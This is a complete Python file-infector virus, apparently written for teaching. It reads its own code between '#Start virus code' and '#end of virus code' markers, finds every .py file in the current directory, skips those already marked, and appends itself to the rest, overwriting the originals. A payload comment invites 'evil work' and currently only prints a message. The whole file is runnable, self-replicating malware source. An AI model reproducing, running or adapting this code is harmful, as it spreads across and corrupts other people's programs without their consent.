#Start virus code

import sys, re, glob

#put a copy of all these lines into a list

virusCode = []

#open this file and read all lines 
#filter out all lines that are not inside the virus code boundary

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

#save the lines into a list to use later

inVirus = False
for line in lines:
    if(re.search("^#Start virus code", line)):
        inVirus = True
        
        #if the virus code has been foud, start appending the 
        #lines to the virsuCode list. We assume that the virus
        #code is always appended to the end of the script.
    if (inVirus == True):
            virusCode.append(line)
    
    if(re.search("^#end of virus code", line)):
           break

#find potential victims 

programs = glob.glob("*.py")

#check adn infecct all programs that glob found 

for p in programs:
    file = open(p, "r")
    programCode= file.readlines()
    file.close()
    
    #check to see if the file is already infected 
    infected = False
    for line in programCode:
        if(re.search("^#Start virus code", line)):
            infected = True
            break
        #stop we don't need to try to infet this program agian
    if not infected:
        newCode = []
            #new version = current + virus code
        newCode = programCode
        newCode.extend(virusCode)

            # write the new version to the file. overwrite the original
        file = open(p, "w")
        file.writelines(newCode)
        file.close()

#payload- do your evil work here
print("This file is infected")
#end of virus code